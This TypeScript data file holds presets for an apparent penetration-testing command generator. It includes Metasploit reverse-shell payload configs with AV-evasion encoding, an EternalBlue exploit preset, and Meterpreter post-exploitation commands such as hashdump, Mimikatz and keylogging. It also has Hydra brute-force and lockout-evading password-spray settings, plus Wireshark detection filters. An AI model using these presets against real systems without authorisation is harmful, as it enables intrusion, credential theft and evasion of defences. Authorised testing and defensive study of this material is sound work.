/**
 * Security Tools Generator Presets & Options (Metasploit, Wireshark, Hydra)
 */

export interface MetasploitPreset {
  id: string;
  name: string;
  category: 'payload' | 'exploit' | 'listener' | 'post';
  description: string;
  module?: string;
  payload: string;
  format?: string;
  encoder?: string;
  iterations?: number;
  badChars?: string;
  lhost: string;
  lport: number;
  rhost?: string;
  rport?: number;
  extraOptions?: Record<string, string>;
}

export interface WiresharkFilterPreset {
  id: string;
  name: string;
  category: 'security' | 'credentials' | 'malware' | 'recon' | 'dos';
  description: string;
  displayFilter: string;
  bpfCaptureFilter: string;
  tsharkCommand: string;
  tcpdumpCommand: string;
  threatExplanation: string;
}

export interface HydraPreset {
  id: string;
  name: string;
  protocol: string;
  defaultPort: number;
  description: string;
  mode: 'brute' | 'spray' | 'single_cred';
  defaultUser: string;
  defaultPassList: string;
  defaultUserList?: string;
  formPath?: string;
  formParams?: string;
  failureCondition?: string;
  recommendedThreads: number;
  evasionDelay?: number;
}

// -------------------------------------------------------------
// METASPLOIT PRESETS & MODULE DATA
// -------------------------------------------------------------
export const METASPLOIT_PAYLOAD_OPTIONS = [
  { id: 'windows/x64/meterpreter/reverse_tcp', name: 'Windows x64 Meterpreter Reverse TCP (Staged)', platform: 'Windows', arch: 'x64', staged: true },
  { id: 'windows/x64/meterpreter_reverse_tcp', name: 'Windows x64 Meterpreter Reverse TCP (Stageless)', platform: 'Windows', arch: 'x64', staged: false },
  { id: 'windows/meterpreter/reverse_tcp', name: 'Windows x86 Meterpreter Reverse TCP (Staged)', platform: 'Windows', arch: 'x86', staged: true },
  { id: 'linux/x64/meterpreter/reverse_tcp', name: 'Linux x64 Meterpreter Reverse TCP (Staged)', platform: 'Linux', arch: 'x64', staged: true },
  { id: 'linux/x64/shell_reverse_tcp', name: 'Linux x64 Shell Reverse TCP', platform: 'Linux', arch: 'x64', staged: false },
  { id: 'python/meterpreter/reverse_tcp', name: 'Python Meterpreter Reverse TCP', platform: 'Multi', arch: 'Python', staged: true },
  { id: 'php/meterpreter_reverse_tcp', name: 'PHP Meterpreter Reverse TCP (Stageless Web Shell)', platform: 'Web', arch: 'PHP', staged: false },
  { id: 'cmd/windows/powershell_reverse_tcp', name: 'Windows PowerShell Reverse TCP One-Liner', platform: 'Windows', arch: 'PowerShell', staged: false },
  { id: 'java/jsp_shell_reverse_tcp', name: 'Java JSP Shell Reverse TCP (Tomcat/JBoss)', platform: 'Web', arch: 'JSP', staged: false }
];

export const METASPLOIT_FORMAT_OPTIONS = [
  { id: 'exe', name: '.exe (Windows PE Executable)' },
  { id: 'elf', name: '.elf (Linux Executable)' },
  { id: 'raw', name: '.bin / raw (Raw Shellcode for Injections)' },
  { id: 'c', name: '.c (C Source Code Array)' },
  { id: 'powershell', name: '.ps1 (PowerShell Script)' },
  { id: 'asp', name: '.asp (Classic IIS Web Shell)' },
  { id: 'aspx', name: '.aspx (Modern IIS Web Shell)' },
  { id: 'war', name: '.war (Java Web Archive)' },
  { id: 'py', name: '.py (Python Executable Script)' }
];

export const METASPLOIT_ENCODER_OPTIONS = [
  { id: 'none', name: 'None (Standard Raw Encoding)' },
  { id: 'x86/shikata_ga_nai', name: 'x86/shikata_ga_nai (Polymorphic XOR Additive Feedback - Excellent)' },
  { id: 'x64/xor_dynamic', name: 'x64/xor_dynamic (Dynamic 64-bit XOR Key)' },
  { id: 'x86/fnstenv_mov', name: 'x86/fnstenv_mov (Variable-length FNSTENV/MOV)' },
  { id: 'cmd/powershell_base64', name: 'cmd/powershell_base64 (UTF-16LE Base64 Obfuscation)' }
];

export const METASPLOIT_PRESETS: MetasploitPreset[] = [
  {
    id: 'msf-handler-reverse-tcp',
    name: 'Universal Multi-Handler Listener',
    category: 'listener',
    description: 'Deploys an active multi/handler listener inside msfconsole to receive staged or stageless Meterpreter callbacks from target networks.',
    module: 'exploit/multi/handler',
    payload: 'windows/x64/meterpreter/reverse_tcp',
    lhost: '0.0.0.0',
    lport: 4444,
    extraOptions: {
      ExitOnSession: 'false',
      EnableStageEncoding: 'true',
      StageEncoder: 'x64/xor_dynamic'
    }
  },
  {
    id: 'msf-venom-win-stealth',
    name: 'Evasive Windows x64 Staged Executable',
    category: 'payload',
    description: 'Generates a stealthy x64 staged executable utilizing null-byte elimination and iterative encoding to evade basic endpoint alerts.',
    payload: 'windows/x64/meterpreter/reverse_tcp',
    format: 'exe',
    encoder: 'x86/shikata_ga_nai',
    iterations: 4,
    badChars: '\\x00\\x0a\\x0d',
    lhost: '192.168.1.100',
    lport: 443
  },
  {
    id: 'msf-eternalblue',
    name: 'MS17-010 EternalBlue SMB Exploit',
    category: 'exploit',
    description: 'Exploits remote SMBv1 heap corruption (CVE-2017-0144) to gain NT AUTHORITY\\SYSTEM shell access across unpatched Windows 7/2008/10 targets.',
    module: 'exploit/windows/smb/ms17_010_eternalblue',
    payload: 'windows/x64/meterpreter/reverse_tcp',
    rhost: '192.168.1.50',
    rport: 445,
    lhost: '192.168.1.100',
    lport: 4444
  },
  {
    id: 'msf-linux-elf',
    name: 'Linux x64 Standalone Staged ELF',
    category: 'payload',
    description: 'Compiles a standalone Linux ELF binary targeting compromised web servers or cloud Linux instances.',
    payload: 'linux/x64/meterpreter/reverse_tcp',
    format: 'elf',
    lhost: '10.10.14.2',
    lport: 4444
  },
  {
    id: 'msf-powershell-oneliner',
    name: 'In-Memory PowerShell Web Delivery',
    category: 'payload',
    description: 'Generates an encoded base64 PowerShell command that executes shellcode directly in RAM without writing to disk (Living off the Land).',
    payload: 'windows/x64/meterpreter/reverse_tcp',
    format: 'powershell',
    encoder: 'cmd/powershell_base64',
    lhost: '10.10.14.2',
    lport: 8443
  }
];

export const METERPRETER_POST_COMMANDS = [
  { cmd: 'sysinfo', desc: 'Displays target OS, computer name, architecture, and language' },
  { cmd: 'getuid', desc: 'Queries the current user account under which Meterpreter runs' },
  { cmd: 'getsystem', desc: 'Attempts automated privilege escalation to NT AUTHORITY\\SYSTEM' },
  { cmd: 'ps', desc: 'Lists all running target processes with PIDs and user accounts' },
  { cmd: 'migrate <PID>', desc: 'Injects Meterpreter into a stable system process (e.g. explorer.exe / svchost.exe)' },
  { cmd: 'hashdump', desc: 'Dumps local NTLM password hashes from the Windows SAM hive' },
  { cmd: 'load kiwi', desc: 'Loads Mimikatz module for memory credential extraction (sekurlsa::logonpasswords)' },
  { cmd: 'keyscan_start', desc: 'Starts covert background keystroke logging on the target session' },
  { cmd: 'keyscan_dump', desc: 'Flushes and displays logged keystrokes to the terminal' },
  { cmd: 'portfwd add -l 3389 -p 3389 -r 10.0.0.5', desc: 'Tunnels local port 3389 to an internal network pivot host' },
  { cmd: 'screenshot', desc: 'Captures and saves a snapshot of the active user desktop' }
];

// -------------------------------------------------------------
// WIRESHARK & TSHARK PRESETS
// -------------------------------------------------------------
export const WIRESHARK_PRESETS: WiresharkFilterPreset[] = [
  {
    id: 'ws-syn-flood',
    name: 'SYN Flood & Port Scan Detection',
    category: 'dos',
    description: 'Detects volumetric TCP SYN attacks and half-open port scans by matching inbound connection attempts that never receive ACK acknowledgments.',
    displayFilter: 'tcp.flags.syn == 1 and tcp.flags.ack == 0',
    bpfCaptureFilter: 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0',
    tsharkCommand: 'tshark -i eth0 -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0" -T fields -e ip.src -e ip.dst -e tcp.dstport',
    tcpdumpCommand: 'tcpdump -i eth0 "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0" -n -nn',
    threatExplanation: 'Volumetric SYN floods saturate OS connection listen queues (backlog). Identifying the source IP helps configure upstream firewall rate limiting.'
  },
  {
    id: 'ws-http-creds',
    name: 'Cleartext HTTP Credentials Sniffing',
    category: 'credentials',
    description: 'Isolates unencrypted web login forms and authentication transmissions containing plaintext password parameters.',
    displayFilter: 'http.request.method == "POST" and (http contains "password" or http contains "pass" or http contains "user")',
    bpfCaptureFilter: 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)',
    tsharkCommand: 'tshark -i eth0 -Y \'http.request.method == "POST"\' -T fields -e ip.src -e http.host -e urlencoded-form.key -e urlencoded-form.value',
    tcpdumpCommand: 'tcpdump -i eth0 "port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)" -A -s 0',
    threatExplanation: 'Web servers serving unencrypted HTTP allow any attacker on the local subnet or switch to harvest credentials via ARP spoofing or port mirroring.'
  },
  {
    id: 'ws-dns-tunnel',
    name: 'DNS Tunneling & Data Exfiltration',
    category: 'malware',
    description: 'Detects covert DNS C2 tunnels (Iodine, DNScat2) characterized by unusually long, base64/hex-encoded domain queries.',
    displayFilter: 'dns.flags.response == 0 and dns.qry.name.len > 35',
    bpfCaptureFilter: 'udp port 53 and udp[8:2] > 70',
    tsharkCommand: 'tshark -i eth0 -Y "dns.flags.response == 0 and dns.qry.name.len > 35" -T fields -e ip.src -e dns.qry.name',
    tcpdumpCommand: 'tcpdump -i eth0 "udp port 53 and greater 70" -A',
    threatExplanation: 'Attackers abuse DNS because UDP port 53 is almost universally permitted egress through corporate firewalls without proxy authentication.'
  },
  {
    id: 'ws-arp-spoof',
    name: 'ARP Poisoning / Man-in-the-Middle',
    category: 'recon',
    description: 'Catches duplicate MAC mappings and Gratuitous ARP packets generated by Ettercap, Arpspoof, or Bettercap.',
    displayFilter: 'arp.duplicate-address-frame or (arp.opcode == 2 and eth.dst == ff:ff:ff:ff:ff:ff)',
    bpfCaptureFilter: 'arp',
    tsharkCommand: 'tshark -i eth0 -Y "arp.duplicate-address-frame" -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac',
    tcpdumpCommand: 'tcpdump -i eth0 "arp" -vv',
    threatExplanation: 'ARP spoofing corrupts the local host\'s ARP table to route all subnet traffic through the attacker\'s interface for eavesdropping.'
  },
  {
    id: 'ws-tls-sni',
    name: 'TLS SNI & Hostname Discovery',
    category: 'recon',
    description: 'Extracts Server Name Indication (SNI) hostnames from TLS Client Hello handshakes to monitor encrypted web destinations.',
    displayFilter: 'tls.handshake.type == 1 and tls.handshake.extensions_server_name',
    bpfCaptureFilter: 'tcp port 443',
    tsharkCommand: 'tshark -i eth0 -Y "tls.handshake.type == 1" -T fields -e ip.src -e ip.dst -e tls.handshake.extensions_server_name',
    tcpdumpCommand: 'tcpdump -i eth0 "tcp port 443 and (tcp[((tcp[12:1] & 0xf0) >> 2)] = 0x16)" -A',
    threatExplanation: 'Even though HTTPS payload traffic is encrypted, the initial Client Hello contains the domain name in cleartext in the SNI field.'
  },
  {
    id: 'ws-smb-ntlm',
    name: 'SMB & NTLMSSP Authentication Handshake',
    category: 'security',
    description: 'Filters Windows SMB negotiation and NTLMSSP challenge-response tokens targeted by Responder or Inveigh for hash capture.',
    displayFilter: 'smb2 || ntlmssp',
    bpfCaptureFilter: 'port 445 or port 139',
    tsharkCommand: 'tshark -i eth0 -Y "ntlmssp" -T fields -e ip.src -e ip.dst -e ntlmssp.auth.username -e ntlmssp.auth.domain',
    tcpdumpCommand: 'tcpdump -i eth0 "port 445" -w smb_capture.pcap',
    threatExplanation: 'Attackers use LLMNR/NBT-NS poisoning to trick Windows clients into sending NTLMv2 challenge responses across SMB to crack with Hashcat.'
  }
];

// -------------------------------------------------------------
// THC-HYDRA PRESETS
// -------------------------------------------------------------
export const HYDRA_PRESETS: HydraPreset[] = [
  {
    id: 'hydra-ssh-wordlist',
    name: 'SSH Remote Server Brute Force',
    protocol: 'ssh',
    defaultPort: 22,
    description: 'Audits Linux SSH servers using multi-threaded dictionary verification with user and password lists.',
    mode: 'brute',
    defaultUser: 'root',
    defaultPassList: '/usr/share/wordlists/rockyou.txt',
    defaultUserList: '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
    recommendedThreads: 16,
    evasionDelay: 0
  },
  {
    id: 'hydra-http-post-form',
    name: 'Web Application Login Form (HTTP POST)',
    protocol: 'http-post-form',
    defaultPort: 80,
    description: 'Automates credential testing against HTML authentication forms using placeholder syntax and failure string matching.',
    mode: 'brute',
    defaultUser: 'admin',
    defaultPassList: '/usr/share/wordlists/rockyou.txt',
    formPath: '/login.php',
    formParams: 'user=^USER^&pass=^PASS^&Login=Submit',
    failureCondition: 'F=Invalid username or password',
    recommendedThreads: 8,
    evasionDelay: 1
  },
  {
    id: 'hydra-password-spray',
    name: 'Enterprise Password Spraying (RDP / SMB)',
    protocol: 'rdp',
    defaultPort: 3389,
    description: 'Tests one common seasonal password across hundreds of employees with wait intervals to evade account lockout policies.',
    mode: 'spray',
    defaultUser: 'users.txt',
    defaultUserList: 'company_employees.txt',
    defaultPassList: 'Autumn2026!',
    recommendedThreads: 4,
    evasionDelay: 30
  },
  {
    id: 'hydra-ftp',
    name: 'FTP Service Credential Verification',
    protocol: 'ftp',
    defaultPort: 21,
    description: 'Tests anonymous and common administrative logins against internal legacy FTP daemons.',
    mode: 'brute',
    defaultUser: 'anonymous',
    defaultPassList: '/usr/share/wordlists/rockyou.txt',
    recommendedThreads: 16,
    evasionDelay: 0
  },
  {
    id: 'hydra-mysql',
    name: 'MySQL Database Server Brute Force',
    protocol: 'mysql',
    defaultPort: 3306,
    description: 'Verifies database root access against exposed MySQL/MariaDB instances over port 3306.',
    mode: 'brute',
    defaultUser: 'root',
    defaultPassList: '/usr/share/wordlists/rockyou.txt',
    recommendedThreads: 8,
    evasionDelay: 0
  }
];
